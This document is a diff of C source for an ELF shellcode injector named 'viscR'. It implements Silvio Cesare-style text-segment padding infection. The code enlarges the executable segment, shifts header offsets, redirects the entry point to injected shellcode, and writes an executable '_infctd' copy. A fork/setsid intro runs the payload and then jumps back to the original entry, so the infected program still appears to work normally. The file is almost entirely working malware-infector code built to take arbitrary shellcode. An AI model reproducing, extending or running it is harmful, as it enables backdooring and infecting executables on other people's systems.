@@ -7,98 +7,42 @@
 #include <unistd.h>
 #include <stdio.h>
 #define JMP_BACK 5
+#define INTRO 40
+#define PAGE_SIZE sysconf(_SC_PAGESIZE)
 
-//TODO ERROR CHECKS
+/*
+	TODO:
+	- error checks
+	- b64 input support
+	- refactor code (clean up, structure for elf, header files etc.)
+	- wrap payload into return-to-original-flow
+	- shrink wrapper using smaller instructions
+	- modify creation date
 
+	MAIN LOGIC:
+	1. receive b64 encoded payload and put it into structure
+	2. do some elf patching  
+*/
+
+//ELF32 wont work because of arch specific instructions #TODO remade shellcode intro
 #if defined(__LP64__)
 # define ElfW(type) Elf64_ ## type
 #else
 # define ElfW(type) Elf32_ ## type
 #endif
 
+void	inject_code(char *fname, ssize_t payload_len, ssize_t fsize, char *mem, ssize_t text_end, ssize_t og_entry, ssize_t new_entry);
+
 //FOR TESTING PURPOSES
 //char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6";
 char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6";
+//char payload[] = "\x6a\x39\x58\x0f\x05\x48\x83\xf8\x00\x74\x11\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x90\x90\x90\x90\x90\x48\xc7\xc0\x70\x00\x00\x00\x0f\x05\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x31\xff\x6a\x3c\x58\x0f\x05";
 
-
+char intro[] = "\x6a\x39\x58\x0f\x05\x48\x83\xf8\x00\x74\x11\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x90\x90\x90\x90\x90\x6a\x70\x58\x0f\x05"; // 5 nops to keep place for jmp to og entry point
 char jmp_back[] = "\xe9\xde\xad\xbe\xef";
+char big_exit[] = "\x31\xff\x6a\x3c\x58\x0f\x05";
 
-int is_sect_exec(char *file, ssize_t fsize, ssize_t entry, int len)
-{
-	ElfW(Ehdr) *ehdr;
-	ElfW(Phdr) *phdr;
-	size_t phdr_num;
-	ssize_t index;
-
-	ehdr = (void *)file;
-	phdr_num = ehdr->e_phnum;
-	if ((ssize_t)(phdr_num * sizeof(ElfW(Phdr)) + ehdr->e_phoff) > fsize)
-	{
-		dprintf(2, "ERROR: Corrupted binary\n");
-		return 0;
-	}
-	phdr = (void *)(file + ehdr->e_phoff);
-	index = 0;
-	if (!phdr_num)
-	{
-		dprintf(2, "ERROR: There is no program header\n");
-		return (0);
-	}
-	while ((size_t)index < phdr_num)
-	{
-		if (!(phdr[index].p_flags & 1) || !(phdr[index].p_flags & 4))	 // PF_Read & PF_Xecute
-		{
-			index++;
-			continue ;
-		}
-		if (phdr[index].p_offset < (size_t)entry &&
-			phdr[index].p_offset + phdr[index].p_filesz + phdr[index].p_align >
-			(size_t)entry + len)
-			return 1;
-		index += 1;
-	}
-	return 0;
-}
-
-ssize_t get_cave_size(char *file, ssize_t off, ssize_t fsize) {
-
-	ssize_t i;
-
-	i = 0;
-	while (i + off < fsize && !file[off + i])
-		i++;
-	return i;
-}
-
-//REMADE AS FOLLOWS ehdr->e_entry = phdr[TEXT].p_vaddr + phdr[TEXT].p_filesz
-ssize_t find_cave(char *file, ssize_t fsize, ssize_t payload_len, ssize_t *cave_size) {
-
-	ssize_t i;
-	ssize_t tmp_size;
-
-	tmp_size = 0;
-	i = 0;
-	while (i < fsize)
-	{
-		if (!file[i] && i % 4 == 0)
-		{
-			tmp_size = get_cave_size(file, i, fsize);
-	
-			if ((tmp_size > payload_len && i != 0) && (is_sect_exec(file, fsize, i , payload_len)))
-			{
-				*cave_size = tmp_size;
-				return (i);
-			}
-			i += tmp_size;
-		}
-		else
-			i += 1;
-	}
-	return 0;
-}
-
-//easier to manipulate file
-char *open_file(char *av, ssize_t *size) {
+char	*open_file(char *av, ssize_t *size) {
 	struct stat fdata;
 	int fd;
 	char *file;
@@ -125,58 +69,108 @@ char *open_file(char *av, ssize_t *size) {
 	return (file);
 }
 
-long	get_vaddr(FILE *fd) {
+char	*craft_payload(char *payload, size_t psize) {
 
-	ElfW(Ehdr) ehdr;
-	ElfW(Phdr) phdr;
+	char *new_payload = calloc(psize + INTRO, sizeof(char *));
+	intro[23] = jmp_back[0];
+    intro[24] = jmp_back[1];
+    intro[25] = jmp_back[2];
+    intro[26] = jmp_back[3];
+    intro[27] = jmp_back[4];
 
-	fseek(fd, 0, SEEK_SET);
-	
-	fread(&ehdr, 1, sizeof(ehdr), fd);
-	int num_heads = ehdr.e_phnum;
-
-	fseek(fd, ehdr.e_phoff, SEEK_SET); //first programm header
-	
-	for (int i = 0; i < num_heads; i++)
-	{
-		fread(&phdr, 1, sizeof(phdr), fd);
-		if (phdr.p_type == PT_LOAD)
-		{
-			printf("Base Address: %lx\n", phdr.p_vaddr);
-			break;
-		}
-	}
-	fseek(fd, 0, SEEK_SET); 
-	return phdr.p_vaddr;
-}
-
-char	*craft_payload(char *pay, char *jmp, size_t size) {
-
-	char *new_payload = calloc(size + JMP_BACK, sizeof(char *));
-	memcpy(new_payload, pay, size);
-	memcpy(new_payload + size, jmp, JMP_BACK);
+	memcpy(new_payload, intro, sizeof(intro) - 1);
+	memcpy(new_payload + sizeof(intro) - 1, payload, psize);
+	memcpy(new_payload + psize + sizeof(intro) - 1, big_exit, sizeof(big_exit) - 1);
 
 	return new_payload;
 }
 
-ssize_t patch_entry(FILE *fd, off_t new_entry, ElfW(Ehdr) *ehdr, ssize_t size) {
-
-        ElfW(Addr) og_entry = ehdr->e_entry;
-	ehdr->e_entry = new_entry;
-        fseek(fd, 0, SEEK_SET);
-        fwrite(ehdr, sizeof(ElfW(Ehdr)), 1,  fd);
+//MAIN LOGIC
+void	silvio_inject(char *fname, ssize_t payload_len, char *payload){
+	ElfW(Ehdr) 	*ehdr;
+	ElfW(Phdr) 	*phdr;
+	ElfW(Shdr) 	*shdr;
+	ElfW(Addr)	og_entry;
+	ElfW(Addr)	og_filesz;
+	ElfW(Addr)	cave_off;
+	ssize_t		fsize;
+	ssize_t		text_end;
+	char		*mem;
 	
-	int jmp_addr = (og_entry - (new_entry + size + JMP_BACK)); // - instruction size AND payload size
+	if (!(mem = open_file(fname, &fsize)))
+		exit(1);
+
+	ehdr = (ElfW(Ehdr) *)mem;
+	phdr = (ElfW(Phdr) *)&mem[ehdr->e_phoff];
+	shdr = (ElfW(Shdr) *)&mem[ehdr->e_shoff];
+
+	for (int i = 0; i < ehdr->e_phnum; i++){
+		if ((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags == (PF_R | PF_X))){
+			og_filesz = phdr[i].p_filesz;
+			text_end = phdr[i].p_offset + phdr[i].p_filesz;
+			cave_off = phdr[i].p_vaddr + og_filesz;
+			og_entry = ehdr->e_entry;
+			ssize_t cave_size = abs((phdr[i].p_vaddr + phdr[i].p_align) - cave_off); 
+			ehdr->e_entry = cave_off;
+			if (cave_size < payload_len ){
+				//make clean_exit()
+				dprintf(2, "Cave is too small to handle payload\n");
+				//fclose(fd);
+				free(mem);
+				exit(1);
+			}
+			phdr[i].p_filesz += payload_len + INTRO;
+			phdr[i].p_memsz += payload_len + INTRO;
+
+			//For each phdr whose segment is after the parasite, increase phdr[x].p_offset by PAGE_SIZE bytes
+			for (int j = i + 1; j < ehdr->e_phnum; j++){
+				if (phdr[j].p_offset > phdr[i].p_offset){
+					phdr[j].p_offset += PAGE_SIZE;
+				}
+			}
+			
+			printf("Found cave at: 0x%lx; With the size of: %d ; Payload size: %d\n", cave_off , cave_size, payload_len);
+			break;
+		}
+	}
+
+	//For every shdr that exists after the parasite insertion, increase shdr[x].sh_offset by PAGE_SIZE.
+	//last shdr in the text segment and increase shdr[x].sh_size by the length of the parasite (because this is the section that the parasite will exist in)
+	for (int i = 0; i < ehdr->e_shnum; i++){
+		if (shdr[i].sh_offset >= text_end)
+			shdr[i].sh_offset += PAGE_SIZE;
+		else if ((shdr[i].sh_addr + shdr[i].sh_size) == cave_off)
+			shdr[i].sh_size += payload_len + INTRO;
+	}
+	ehdr->e_shoff += PAGE_SIZE;
+
+	//patch binary
+	inject_code(fname, payload_len, fsize, mem, text_end, og_entry, cave_off);
+
+}
+
+void	inject_code(char *fname, ssize_t payload_len, ssize_t fsize, char *mem, ssize_t text_end, ssize_t og_entry, ssize_t new_entry){
+	int 			fd;
+	unsigned int	c;
+	int i, t = 0;
+	char fcopy[256];
+
+	snprintf(fcopy, sizeof(fcopy), "%s_infctd", fname);
+	fd = open(fcopy, O_CREAT | O_WRONLY | O_TRUNC, 0755);
+	write(fd, mem, text_end);
+
+	int jmp_addr = (og_entry - (new_entry + 28)); // fork + cmp + je + xors + jmp to og_entry
 	//printf("jmp addr = %d\npayload = %d\n", jmp_addr, sizeof(payload));
 	memcpy(jmp_back + 1, &jmp_addr, sizeof(jmp_addr));
+	char *new_payload = craft_payload(payload, payload_len);
+	write(fd, new_payload, payload_len + INTRO);
+	lseek(fd, PAGE_SIZE - (payload_len + INTRO), SEEK_CUR);
+	mem += text_end;
 
-	//write payload
-        fseek(fd, new_entry, SEEK_SET);
-	char *new_payload = craft_payload(payload, jmp_back, size);
-	fwrite(new_payload, sizeof(char *), size + JMP_BACK, fd);
-	free(new_payload);
-	fclose(fd);
-	return 0; 
+	unsigned int last_chunk = fsize - text_end;
+	write(fd, mem, last_chunk);
+	munmap(mem, fsize);
+	close(fd);
 }
 
 int main(int ac, char **av) {
@@ -188,36 +182,18 @@ int main(int ac, char **av) {
 	long 		base;
 	char 		*file; 
 	FILE 		*fd;
-	size_t 		payload_size;
+	size_t 		payload_len;
 
 	if (ac < 2){
 		printf("viscR --- Shellcode Injector\n");
-		printf("Usage: ./viscR <binary> <payload generated by craft_shell.sh>\n");
+		printf("Usage: ./viscR <binary> <b64 encoded payload>\n");
 		exit(0);
 	}
+	
+	//init struct for readability
+	
+	payload_len = sizeof(payload) - 1;
 
-	if (!(file = open_file(av[1], &fsize)))
-		exit(1);
-
-	if (!(fd = fopen(av[1], "r+b"))) {
-		dprintf(2, "fopen: Can't open file\n");
-		exit(1);
-	}
-
-        fread(&ehdr, 1, sizeof(ehdr), fd);
-	base = get_vaddr(fd);
-
-	payload_size = sizeof(payload) - 1;
-	if ((cave = find_cave(file, fsize, payload_size + JMP_BACK, &csize)) == 0) {
-		dprintf(2, "Cave is too small to handle payload\n");
-		fclose(fd);
-		exit(1);
-	}
-	cave += base;
-
-	printf("Found cave at: 0x%lx; With the size of: %d ; Payload size: %d\n", cave , csize, payload_size);
-
-	patch_entry(fd, cave, &ehdr, payload_size);
-
+	silvio_inject(av[1], payload_len, payload);
 	return 0;
-}	
+};
